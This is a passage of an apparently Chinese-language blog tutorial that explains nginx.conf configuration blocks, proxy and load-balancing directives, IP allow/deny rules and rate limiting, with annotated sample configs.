class=\"line\">#设定http服务器，利用它的反向代理功能提供负载均衡支持</span><br><span class=\"line\">http</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    #文件扩展名与文件类型映射表</span><br><span class=\"line\">    include mime.types;</span><br><span class=\"line\"></span><br><span class=\"line\">    #默认文件类型</span><br><span class=\"line\">    default_type application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    #默认编码</span><br><span class=\"line\">    #charset utf-8;</span><br><span class=\"line\"></span><br><span class=\"line\">    #服务器名字的hash表大小</span><br><span class=\"line\">    #保存服务器名字的hash表是由指令server_names_hash_max_size 和server_names_hash_bucket_size所控制的。参数hash bucket size总是等于hash表的大小，并且是一路处理器缓存大小的倍数。在减少了在内存中的存取次数后，使在处理器中加速查找hash表键值成为可能。如果hash bucket size等于一路处理器缓存的大小，那么在查找键的时候，最坏的情况下在内存中查找的次数为2。第一次是确定存储单元的地址，第二次是在存储单元中查找键 值。因此，如果Nginx给出需要增大hash max size 或 hash bucket size的提示，那么首要的是增大前一个参数的大小.</span><br><span class=\"line\">    server_names_hash_bucket_size 128;</span><br><span class=\"line\"></span><br><span class=\"line\">    #客户端请求头部的缓冲区大小。这个可以根据你的系统分页大小来设置，一般一个请求的头部大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。分页大小可以用命令getconf PAGESIZE取得。</span><br><span class=\"line\">    client_header_buffer_size 32k;</span><br><span class=\"line\"></span><br><span class=\"line\">    #客户请求头缓冲大小。nginx默认会用client_header_buffer_size这个buffer来读取header值，如果header过大，它会使用large_client_header_buffers来读取。</span><br><span class=\"line\">    large_client_header_buffers 4 64k;</span><br><span class=\"line\"></span><br><span class=\"line\">    #设定通过nginx上传文件的大小</span><br><span class=\"line\">    client_max_body_size 8m;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。注意：如果图片显示不正常把这个改成off。</span><br><span class=\"line\">    #sendfile指令指定 nginx 是否调用sendfile 函数（zero copy 方式）来输出文件，对于普通应用，必须设为on。如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络IO处理速度，降低系统uptime。</span><br><span class=\"line\">    sendfile on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启目录列表访问，合适下载服务器，默认关闭。</span><br><span class=\"line\">    autoindex on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #此选项允许或禁止使用socke的TCP_CORK的选项，此选项仅在使用sendfile的时候使用</span><br><span class=\"line\">    tcp_nopush on;</span><br><span class=\"line\"></span><br><span class=\"line\">    tcp_nodelay on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #长连接超时时间，单位是秒</span><br><span class=\"line\">    keepalive_timeout 120;</span><br><span class=\"line\"></span><br><span class=\"line\">    #FastCGI相关参数是为了改善网站的性能：减少资源占用，提高访问速度。下面参数看字面意思都能理解。</span><br><span class=\"line\">    fastcgi_connect_timeout 300;</span><br><span class=\"line\">    fastcgi_send_timeout 300;</span><br><span class=\"line\">    fastcgi_read_timeout 300;</span><br><span class=\"line\">    fastcgi_buffer_size 64k;</span><br><span class=\"line\">    fastcgi_buffers 4 64k;</span><br><span class=\"line\">    fastcgi_busy_buffers_size 128k;</span><br><span class=\"line\">    fastcgi_temp_file_write_size 128k;</span><br><span class=\"line\"></span><br><span class=\"line\">    #gzip模块设置</span><br><span class=\"line\">    gzip on; #开启gzip压缩输出</span><br><span class=\"line\">    gzip_min_length 1k;    #最小压缩文件大小</span><br><span class=\"line\">    gzip_buffers 4 16k;    #压缩缓冲区</span><br><span class=\"line\">    gzip_http_version 1.0;    #压缩版本（默认1.1，前端如果是squid2.5请使用1.0）</span><br><span class=\"line\">    gzip_comp_level 2;    #压缩等级</span><br><span class=\"line\">    gzip_types text/plain application/x-javascript text/css application/xml;    #压缩类型，默认就已经包含textml，所以下面就不用再写了，写上去也不会有问题，但是会有一个warn。</span><br><span class=\"line\">    gzip_vary on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启限制IP连接数的时候需要使用</span><br><span class=\"line\">    #limit_zone crawler $binary_remote_addr 10m;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    #负载均衡配置</span><br><span class=\"line\">    upstream piao.jd.com &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        #upstream的负载均衡，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。</span><br><span class=\"line\">        server 192.168.80.121:80 weight=3;</span><br><span class=\"line\">        server 192.168.80.122:80 weight=2;</span><br><span class=\"line\">        server 192.168.80.123:80 weight=3;</span><br><span class=\"line\"></span><br><span class=\"line\">        #nginx的upstream目前支持4种方式的分配</span><br><span class=\"line\">        #1、轮询（默认）</span><br><span class=\"line\">        #每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。</span><br><span class=\"line\">        #2、weight</span><br><span class=\"line\">        #指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。</span><br><span class=\"line\">        #例如：</span><br><span class=\"line\">        #upstream bakend &#123;</span><br><span class=\"line\">        #    server 192.168.0.14 weight=10;</span><br><span class=\"line\">        #    server 192.168.0.15 weight=10;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">        #2、ip_hash</span><br><span class=\"line\">        #每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。</span><br><span class=\"line\">        #例如：</span><br><span class=\"line\">        #upstream bakend &#123;</span><br><span class=\"line\">        #    ip_hash;</span><br><span class=\"line\">        #    server 192.168.0.14:88;</span><br><span class=\"line\">        #    server 192.168.0.15:80;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">        #3、fair（第三方）</span><br><span class=\"line\">        #按后端服务器的响应时间来分配请求，响应时间短的优先分配。</span><br><span class=\"line\">        #upstream backend &#123;</span><br><span class=\"line\">        #    server server1;</span><br><span class=\"line\">        #    server server2;</span><br><span class=\"line\">        #    fair;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">        #4、url_hash（第三方）</span><br><span class=\"line\">        #按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。</span><br><span class=\"line\">        #例：在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法</span><br><span class=\"line\">        #upstream backend &#123;</span><br><span class=\"line\">        #    server squid1:3128;</span><br><span class=\"line\">        #    server squid2:3128;</span><br><span class=\"line\">        #    hash $request_uri;</span><br><span class=\"line\">        #    hash_method crc32;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #tips:</span><br><span class=\"line\">        #upstream bakend&#123;#定义负载均衡设备的Ip及设备状态&#125;&#123;</span><br><span class=\"line\">        #    ip_hash;</span><br><span class=\"line\">        #    server 127.0.0.1:9090 down;</span><br><span class=\"line\">        #    server 127.0.0.1:8080 weight=2;</span><br><span class=\"line\">        #    server 127.0.0.1:6060;</span><br><span class=\"line\">        #    server 127.0.0.1:7070 backup;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">        #在需要使用负载均衡的server中增加 proxy_pass http://bakend/;</span><br><span class=\"line\"></span><br><span class=\"line\">        #每个设备的状态设置为:</span><br><span class=\"line\">        #1.down表示单前的server暂时不参与负载</span><br><span class=\"line\">        #2.weight为weight越大，负载的权重就越大。</span><br><span class=\"line\">        #3.max_fails：允许请求失败的次数默认为1.当超过最大次数时，返回proxy_next_upstream模块定义的错误</span><br><span class=\"line\">        #4.fail_timeout:max_fails次失败后，暂停的时间。</span><br><span class=\"line\">        #5.backup： 其它所有的非backup机器down或者忙的时候，请求backup机器。所以这台机器压力会最轻。</span><br><span class=\"line\"></span><br><span class=\"line\">        #nginx支持同时设置多组的负载均衡，用来给不用的server来使用。</span><br><span class=\"line\">        #client_body_in_file_only设置为On 可以讲client post过来的数据记录到文件中用来做debug</span><br><span class=\"line\">        #client_body_temp_path设置记录文件的目录 可以设置最多3层目录</span><br><span class=\"line\">        #location对URL进行匹配.可以进行重定向或者进行新的代理 负载均衡</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    #虚拟主机的配置</span><br><span class=\"line\">    server</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        #监听端口</span><br><span class=\"line\">        listen 80;</span><br><span class=\"line\"></span><br><span class=\"line\">        #域名可以有多个，用空格隔开</span><br><span class=\"line\">        server_name www.jd.com jd.com;</span><br><span class=\"line\">        index index.html index.htm index.php;</span><br><span class=\"line\">        root /data/www/jd;</span><br><span class=\"line\"></span><br><span class=\"line\">        #对******进行负载均衡</span><br><span class=\"line\">        location ~ .*.(php|php5)?$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            fastcgi_pass 127.0.0.1:9000;</span><br><span class=\"line\">            fastcgi_index index.php;</span><br><span class=\"line\">            include fastcgi.conf;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #图片缓存时间设置</span><br><span class=\"line\">        location ~ .*.(gif|jpg|jpeg|png|bmp|swf)$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            expires 10d;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #JS和CSS缓存时间设置</span><br><span class=\"line\">        location ~ .*.(js|css)?$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            expires 1h;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #日志格式设定</span><br><span class=\"line\">        #$remote_addr与$http_x_forwarded_for用以记录客户端的ip地址；</span><br><span class=\"line\">        #$remote_user：用来记录客户端用户名称；</span><br><span class=\"line\">        #$time_local： 用来记录访问时间与时区；</span><br><span class=\"line\">        #$request： 用来记录请求的url与http协议；</span><br><span class=\"line\">        #$status： 用来记录请求状态；成功是200，</span><br><span class=\"line\">        #$body_bytes_sent ：记录发送给客户端文件主体内容大小；</span><br><span class=\"line\">        #$http_referer：用来记录从那个页面链接访问过来的；</span><br><span class=\"line\">        #$http_user_agent：记录客户浏览器的相关信息；</span><br><span class=\"line\">        #通常web服务器放在反向代理的后面，这样就不能获取到客户的IP地址了，通过$remote_add拿到的IP地址是反向代理服务器的iP地址。反向代理服务器在转发请求的http头信息中，可以增加x_forwarded_for信息，用以记录原有客户端的IP地址和原来客户端的请求的服务器地址。</span><br><span class=\"line\">        log_format access &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class=\"line\">        &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class=\"line\">        &apos;&quot;$http_user_agent&quot; $http_x_forwarded_for&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">        #定义本虚拟主机的访问日志</span><br><span class=\"line\">        access_log  /usr/local/nginx/logs/host.access.log  main;</span><br><span class=\"line\">        access_log  /usr/local/nginx/logs/host.access.404.log  log404;</span><br><span class=\"line\"></span><br><span class=\"line\">        #对 &quot;/&quot; 启用反向代理</span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            proxy_pass http://127.0.0.1:88;</span><br><span class=\"line\">            proxy_redirect off;</span><br><span class=\"line\">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class=\"line\"></span><br><span class=\"line\">            #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP</span><br><span class=\"line\">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\"></span><br><span class=\"line\">            #以下是一些反向代理的配置，可选。</span><br><span class=\"line\">            proxy_set_header Host $host;</span><br><span class=\"line\"></span><br><span class=\"line\">            #允许客户端请求的最大单文件字节数</span><br><span class=\"line\">            client_max_body_size 10m;</span><br><span class=\"line\"></span><br><span class=\"line\">            #缓冲区代理缓冲用户端请求的最大字节数，</span><br><span class=\"line\">            #如果把它设置为比较大的数值，例如256k，那么，无论使用firefox还是IE浏览器，来提交任意小于256k的图片，都很正常。如果注释该指令，使用默认的client_body_buffer_size设置，也就是操作系统页面大小的两倍，8k或者16k，问题就出现了。</span><br><span class=\"line\">            #无论使用firefox4.0还是IE8.0，提交一个比较大，200k左右的图片，都返回500 Internal Server Error错误</span><br><span class=\"line\">            client_body_buffer_size 128k;</span><br><span class=\"line\"></span><br><span class=\"line\">            #表示使nginx阻止HTTP应答代码为400或者更高的应答。</span><br><span class=\"line\">            proxy_intercept_errors on;</span><br><span class=\"line\"></span><br><span class=\"line\">            #后端服务器连接的超时时间_发起握手等候响应超时时间</span><br><span class=\"line\">            #nginx跟后端服务器连接超时时间(代理连接超时)</span><br><span class=\"line\">            proxy_connect_timeout 90;</span><br><span class=\"line\"></span><br><span class=\"line\">            #后端服务器数据回传时间(代理发送超时)</span><br><span class=\"line\">            #后端服务器数据回传时间_就是在规定时间之内后端服务器必须传完所有的数据</span><br><span class=\"line\">            proxy_send_timeout 90;</span><br><span class=\"line\"></span><br><span class=\"line\">            #连接成功后，后端服务器响应时间(代理接收超时)</span><br><span class=\"line\">            #连接成功后_等候后端服务器响应时间_其实已经进入后端的排队之中等候处理（也可以说是后端服务器处理请求的时间）</span><br><span class=\"line\">            proxy_read_timeout 90;</span><br><span class=\"line\"></span><br><span class=\"line\">            #设置代理服务器（nginx）保存用户头信息的缓冲区大小</span><br><span class=\"line\">            #设置从被代理服务器读取的第一部分应答的缓冲区大小，通常情况下这部分应答中包含一个小的应答头，默认情况下这个值的大小为指令proxy_buffers中指定的一个缓冲区的大小，不过可以将其设置为更小</span><br><span class=\"line\">            proxy_buffer_size 4k;</span><br><span class=\"line\"></span><br><span class=\"line\">            #proxy_buffers缓冲区，网页平均在32k以下的设置</span><br><span class=\"line\">            #设置用于读取应答（来自被代理服务器）的缓冲区数目和大小，默认情况也为分页大小，根据操作系统的不同可能是4k或者8k</span><br><span class=\"line\">            proxy_buffers 4 32k;</span><br><span class=\"line\"></span><br><span class=\"line\">            #高负荷下缓冲大小（proxy_buffers*2）</span><br><span class=\"line\">            proxy_busy_buffers_size 64k;</span><br><span class=\"line\"></span><br><span class=\"line\">            #设置在写入proxy_temp_path时数据的大小，预防一个工作进程在传递文件时阻塞太长</span><br><span class=\"line\">            #设定缓存文件夹大小，大于这个值，将从upstream服务器传</span><br><span class=\"line\">            proxy_temp_file_write_size 64k;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        #设定查看Nginx状态的地址</span><br><span class=\"line\">        location /NginxStatus &#123;</span><br><span class=\"line\">            stub_status on;</span><br><span class=\"line\">            access_log on;</span><br><span class=\"line\">            auth_basic &quot;NginxStatus&quot;;</span><br><span class=\"line\">            auth_basic_user_file confpasswd;</span><br><span class=\"line\">            #htpasswd文件的内容可以用apache提供的htpasswd工具来产生。</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #本地动静分离反向代理配置</span><br><span class=\"line\">        #所有jsp的页面均交由tomcat或resin处理</span><br><span class=\"line\">        location ~ .(jsp|jspx|do)?$ &#123;</span><br><span class=\"line\">            proxy_set_header Host $host;</span><br><span class=\"line\">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class=\"line\">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\">            proxy_pass http://127.0.0.1:8080;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #所有静态文件由nginx直接读取不经过tomcat或resin</span><br><span class=\"line\">        location ~ .*.(htm|html|gif|jpg|jpeg|png|bmp|swf|ioc|rar|zip|txt|flv|mid|doc|ppt|</span><br><span class=\"line\">        pdf|xls|mp3|wma)$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            expires 15d;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        location ~ .*.(js|css)?$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            expires 1h;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">######Nginx配置文件nginx.conf中文详解#####</span><br></pre></td></tr></table></figure><br><br></details>\n\n<h2 id=\"1-全局块\"><a href=\"#1-全局块\" class=\"headerlink\" title=\"1.全局块\"></a>1.全局块</h2><p>全局块是默认配置文件从开始到events块之间的一部分内容，主要设置一些影响Nginx服务器整体运行的配置指令，作用域是Nginx服务器全局。<br><br>通常包含配置运行Nginx服务器的用户（组）、允许生成的worker process数，Nginx进程PID存放路径、日志的存放路径和类型以及配置文件引入等。<br></p>\n<h2 id=\"2-events块\"><a href=\"#2-events块\" class=\"headerlink\" title=\"2.events块\"></a>2.events块</h2><p>events块设计的指令主要影响Nginx服务器与用户的网络连接。常用到的设置包括是选取哪种事件驱动模型处理连接请求，每个worker process可以同时支持的最大连接数等。<br><br>这一部分的指令对Nginx服务器的性能影响较大，在实际配置中应该根据实际情况灵活调整。<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">events &#123;</span><br><span class=\"line\">    # epoll linux下的高效工作模型首选</span><br><span class=\"line\">    use epoll;</span><br><span class=\"line\"></span><br><span class=\"line\">    #worker_connections用于定义Nginx每个进程的最大连接数</span><br><span class=\"line\">    # 即接收前端的最大请求数</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-http块\"><a href=\"#3-http块\" class=\"headerlink\" title=\"3.http块\"></a>3.http块</h2><p>http块是Nginx服务器配置中的重要部分，代理、缓存和日志定义等绝大多数的功能和第三方模块的配置都可以放在这个模块中。<br><br>http块中可以包含自己的全局块，也可以包含server块，server块中又进一步包含location块。<br><br>可以在http全局块中配置的指令包括文件引入、MIME-Type定义、日志自定义、是否使用sendfile传输文件、连接超时时间、单请求数上线等。</p>\n<h3 id=\"3-1-http全局\"><a href=\"#3-1-http全局\" class=\"headerlink\" title=\"3.1 http全局\"></a>3.1 http全局</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    #文件扩展名与文件类型映射表 mime(多用途因特网邮件扩展)</span><br><span class=\"line\">    include mime.types;</span><br><span class=\"line\"></span><br><span class=\"line\">    #默认文件类型</span><br><span class=\"line\">    default_type application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    #默认编码</span><br><span class=\"line\">    charset utf-8;</span><br><span class=\"line\"></span><br><span class=\"line\">    #设定通过nginx上传文件的大小</span><br><span class=\"line\">    client_max_body_size 8m;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启高效文件传输模式</span><br><span class=\"line\">    sendfile on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启目录列表访问，合适下载服务器，默认关闭。</span><br><span class=\"line\">    autoindex on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #此选项允许或禁止使用socke的TCP_CORK的选项，此选项仅在使用sendfile的时候使用</span><br><span class=\"line\">    tcp_nopush on;</span><br><span class=\"line\">    tcp_nodelay on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #长连接超时时间，单位是秒</span><br><span class=\"line\">    keepalive_timeout 120;</span><br><span class=\"line\"></span><br><span class=\"line\">    #gzip模块设置</span><br><span class=\"line\">    gzip on; #开启gzip压缩输出</span><br><span class=\"line\">    gzip_min_length 1k;    #最小压缩文件大小</span><br><span class=\"line\">    gzip_buffers 4 16k;    #压缩缓冲区</span><br><span class=\"line\">    gzip_http_version 1.0;    #压缩版本</span><br><span class=\"line\">    gzip_comp_level 2;    #压缩等级</span><br><span class=\"line\">    gzip_types text/plain application/x-javascript text/css application/xml;    #压缩类型，默认就已经包含textml</span><br><span class=\"line\">    gzip_vary on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启限制IP连接数的时候需要使用</span><br><span class=\"line\">    #limit_zone crawler $binary_remote_addr 10m;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-2-server\"><a href=\"#3-2-server\" class=\"headerlink\" title=\"3.2 server\"></a>3.2 server</h3><p>每个server块就相当于一台虚拟主机，它内部可有多台主机联合提供服务，一起对外提供一组服务<br></p>\n<h4 id=\"3-2-1-server全局\"><a href=\"#3-2-1-server全局\" class=\"headerlink\" title=\"3.2.1  server全局\"></a>3.2.1  server全局</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">        #监听的端口</span><br><span class=\"line\">        listen       8080;</span><br><span class=\"line\"></span><br><span class=\"line\">        #用来指定IP地址或者域名，多个域名之间用空格分开， 可以通配符 *.test.com</span><br><span class=\"line\">        server_name  localhost 192.168.12.10 www.yangyi.com;</span><br><span class=\"line\"></span><br><span class=\"line\">        #根目录</span><br><span class=\"line\">        #root   /Users/yangyi/www;</span><br><span class=\"line\">        #初始页面 自左向右匹配</span><br><span class=\"line\">        #index  index.php index.html index.htm;</span><br><span class=\"line\"></span><br><span class=\"line\">        charset utf-8;</span><br><span class=\"line\"></span><br><span class=\"line\">        #日志路径与级别</span><br><span class=\"line\">        access_log  usr/local/var/log/host.access.log  main;</span><br><span class=\"line\">        aerror_log  usr/local/var/log/host.error.log  error;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-2-2-upstream\"><a href=\"#3-2-2-upstream\" class=\"headerlink\" title=\"3.2.2 upstream\"></a>3.2.2 upstream</h4><p>定义服务集群，用于负载均衡.<br></p>\n<h4 id=\"3-2-3-location\"><a href=\"#3-2-3-location\" class=\"headerlink\" title=\"3.2.3 location\"></a>3.2.3 location</h4><p>location块的主要作用是，基于Nginx服务器接收到的请求字符串进行匹配，对特定的请求进行处理<br></p>\n<p> <strong> location [=|~|~*|^~|@] /uri/ { … } </strong></p>\n<p> location 可分两大类：</p>\n<ul>\n<li>普通 location<br></li>\n</ul>\n<p> 以 “ = ” 或 “ ^~ ”为前缀或者没有任何前缀的 /uri/</p>\n<ul>\n<li>正则 location</li>\n</ul>\n<p>以 “ ~ ” 或 “ ~* ”为前缀的 /uri/, 即以  ~ 开头的<br><br>正则的意义是，url中可以使用正则<br></p>\n<p>=：表示完全匹配，不存在正则表示，如 location = /uri {…..}</p>\n<p>~：表示匹配时，大小写敏感的，如 location ~ /uri {…..} </p>\n<p>~*：表示匹配时，大小写不敏感，即忽略大小写问题，如 location ~* /uri {……}，这时/uri，/Uri， /URI都可以匹配上。</p>\n<p>^~：表示匹配时，只需开头部分匹配上即可，如 location ^~ /uri/ {….}  ，这时只要以/uri/开头的地址都会匹配上<br></p>\n<p><strong>location详细讲解参考 location模块.md</strong></p>\n<h1 id=\"三-其它\"><a href=\"#三-其它\" class=\"headerlink\" title=\"三.其它\"></a>三.其它</h1><h2 id=\"1-nginx限制访问ip\"><a href=\"#1-nginx限制访问ip\" class=\"headerlink\" title=\"1.nginx限制访问ip\"></a>1.nginx限制访问ip</h2><p>黑白名单</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 服务器全局限制</span><br><span class=\"line\">allow 67.216.218.37;</span><br><span class=\"line\">deny all;</span><br><span class=\"line\"></span><br><span class=\"line\"># location中限制</span><br><span class=\"line\">location / &#123;</span><br><span class=\"line\">    index index.html index.htm index.php;</span><br><span class=\"line\">    allow 67.216.218.37;</span><br><span class=\"line\">    deny all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>注意:<br></li>\n</ul>\n<p>可以使用IP段<br><br>从允许访问的段位从小到大排列,如127.0.0.0/24 下面才能是10.10.0.0/16<br><br>deny all; 结尾 表示除了上面allow的其他都禁止<br></p>\n<p>deny 192.168.1.1;<br><br>allow 127.0.0.0/24;<br><br>allow 192.168.0.0/16;<br><br>allow 10.10.0.0/16;<br><br>deny all;<br></p>\n<h2 id=\"2-限制下载速度\"><a href=\"#2-限制下载速度\" class=\"headerlink\" title=\"2.限制下载速度\"></a>2.限制下载速度</h2><p>限速</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location /download &#123;</span><br><span class=\"line\">       # 10m之前不限速</span><br><span class=\"line\">       limit_rate_after 10m;</span><br><span class=\"line\">       limit_rate 128k;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-限制ip访问频率\"><a href=\"#3-限制ip访问频率\" class=\"headerlink\" title=\"3.限制ip访问频率\"></a>3.限制ip访问频率</h2><p>防攻击</p>\n<ul>\n<li>limit_req_zone</li>\n</ul>\n<p>这个变量只能在http使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  #定义一个名为allips的limit_req_zone用来存储session，大小是10M内存，</span><br><span class=\"line\">  #以$binary_remote_addr 为key,限制平均每秒的请求为5个，</span><br><span class=\"line\">  #1M能存储16000个状态，rete的值必须为整数，</span><br><span class=\"line\">  #如果限制两秒钟一个请求，可以设置成30r/m</span><br><span class=\"line\"></span><br><span class=\"line\">  limit_req_zone $binary_remote_addr zone=allips:10m rate=5r/s;</span><br><span class=\"line\">  ...</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>limit_req</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">  server&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    location &#123;</span><br><span class=\"line\">      ...</span><br><span class=\"line\">      #限制每ip每秒不超过20个请求，漏桶数burst为5</span><br><span class=\"line\">      #brust的意思就是，如果第1秒、2,3,4秒请求为19个，</span><br><span class=\"line\">      #第5秒的请求为25个是被允许的。</span><br><span class=\"line\">      #但是如果你第1秒就25个请求，第2秒超过20的请求返回503错误。</span><br><span class=\"line\">      #nodelay，如果不设置该选项，严格使用平均速率限制请求数，</span><br><span class=\"line\">      #第1秒25个请求时，5个请求放到第2秒执行，</span><br><span class=\"line\">      